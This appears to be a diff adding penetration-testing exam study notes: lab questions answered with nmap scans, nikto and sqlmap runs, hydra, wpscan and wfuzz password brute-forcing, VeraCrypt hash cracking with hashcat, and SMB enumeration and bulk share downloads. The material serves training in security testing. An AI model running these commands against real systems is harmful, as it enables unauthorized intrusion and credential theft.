@@ -1,0 +1,142 @@
+
+//discover devices inside the network eth0
+netdiscover -i eth0  // more time consuming than nmap
+
+-sn = Disable port scanning. Host discovery only.
+-Pn = Disable host discovery, Port scan only.
+
+// Common Ports
+
+smb 445
+rdp 3389
+mysql 3306
+
+
+nmap -sN -p 3389 10.10.10.0/24 // null scan little bit stealtheir 
+nmap -Pn -p 3389 10.10.10.0/24 // quick scan act all host are online
+
+nmap -sn 192.168.0.0/24
+
+- Find the IP address of the machine which is running the RDP?
+|--> sudo nmap -p 3389 -Pn IP/24
+- What is the IP of the Windows machine?
+|-->  sudo nmap -p 3389 -Pn IP/24
+5. Find the OS name of the machine which is running MySQL database?  
+|-->  sudo nmap -p 3306 -Pn IP/24
+7. What is the password for user X of the FTP server?
+|-->  sudo hydra -l X -P /usr/share/wordlist/rockyou.txt ftp://I0.10.10.10.0
+9. Find the HTTP method that poses a high risk to the application example.com?  
+|--> sudo nmap -p 80 -Pn IP/24
+|--> nikto --url IP
+11. Find the Phone number the employee? 
+|--> sqlmap -u IP 
+13. Find the file name which is tampered by comparing the hashes which is given in the /hashes folder?  
+|--> I find out multiple ways to solve this question first if we on a windows machine, than we can use **Hashmyfiles** like tool to calculate hashes of multiples files, and second way we can use powershell.
+
+```powershell
+Get-ChildItem -Recurse | ForEach-Object { Get-FileHash $_.FullName -Algorithm md5 } | Format-Table -Property Algorithm, Hash > hashes.txt
+```
+
+In linux we can also use this command to calculate hashes 
+```bash
+find . -type f -exec sha256sum {} + > hashes.txt
+```
+
+1. Decrypt the volume file using veracrypt? 
+|--> Suppose if the volume is hidden than how we can unhide it
+first launch the command prompt and goto
+
+```powershell
+c:\\> diskpart
+DISKPART> list vulume
+DISKPART> select volume 3
+DISKPART> assign letter H
+DISKPART> exit
+```
+
+### Using VeraCrypt GUI:
+1. **Select Encrypted Volume:**
+    - In the VeraCrypt main window, click on the "Select File" button to choose the encrypted volume file.
+2. **Mount Volume:**
+    - After selecting the volume file, click on the "Mount" button.
+3. **Enter Password:**
+    - Enter the password associated with the encrypted volume when prompted. If you are using a keyfile, select it as well.
+4. **Select Mount Point:**
+    - Choose a drive letter or an empty folder as the mount point for the decrypted volume. Click "OK" to proceed.
+5. **Access the Decrypted Volume:**
+    - Once the volume is successfully mounted, you can access it through the assigned drive letter or the chosen mount point. The contents of the volume will be accessible as if it were a regular drive
+
+**Brute force veracrypt:**
+this will generate the hash encrypted key for veracrypt which we can brute force by hashcat
+```powershell
+.\dd.exe if=..\temp\target of=..\temp\target_hash.tc bs=512 count=1
+hashcat.exe -a 3 -w 1 -m 13721 hash.tc ?d?d?d?d or we can use the wordlist
+```
+
+- -m 13721 is the specific mode for cracking VeraCrypt’s SHA 512 bytes encryption
+- ?d?d?d?d is the mask (where ?d represents a numeric value 0-9)
+
+1. Connect to the Server remotely using the credentials give by RDP?  
+```powershell
+Enable-PSRemoting -Force
+Enter-PSSession -ComputerName Server01 -Credential Administrator
+Invoke-Command -ComputerName Server01 -ScriptBlock { <Command> } -credential Administrator
+mstsc /v:192.168.1.100:3389
+```
+
+- `<ComputerName>` is the name of the computer that you want to connect to.
+- `<UserName>` is the user name that you want to use to connect to the computer.
+- `<Command>` is the command that you want to run on the remote computer.
+- `<IP address of the remote PC>` is the IP address of the computer that you want to connect to.
+
+
+3. Decode the file which is encoded in DES(ECB. format?  
+4. Find the password of the wordpress user “Raj”?  
+|--> metasploit ----> wordpress_login_enum
+|--> wpscan --url IP -u Raj -P /usr/share/wordlists/rockyou.txt
+
+
+
+**nmap smb scripts-**
+```bash
+nmap --script smb-os-discovery.nse -p 445 <ip>  (enumerate os, domain name,etc)
+
+nmap --script smb-enum-users.nse -p 445 <ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)
+
+nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)
+
+smbclient //10.10.19.21/anonymous  (accessing smb shares)
+
+smbget -R smb://10.10.19.21/anonymous   (downloading smb files)
+
+```
+
+download all smb shares files
+```bash
+smbmap -H IP // to list out the all share with their permissions
+
+smbclient //IP/shares // to login with the perticuller share
+smb> recurse ON
+smb> prompt OFF
+smb> mget *
+
+
+smbmap -R share -H IP
+// to list out all files in the perticular share
+
+smbmap -R share -H IP -A filename -q 
+//to download the file
+```
+
+```bash
+netexec smb IP // upgraded version of crackmapexec
+
+
+hydra -l '' -P 3digit.txt 10.10.253.183 -s 8000 http-form-post -m '/pin.php:username=^USER^&password=^PASS^:Access denied'
+
+hydra -L users.txt -P passwords.txt 10.10.200.90 http-form-post -m '/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials'           
+
+wfuzz -c -z file,users.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.200.90/login.php -d "username=FUZZ&password=FUZ2Z"
+
+
+dsss.py // for sql injection
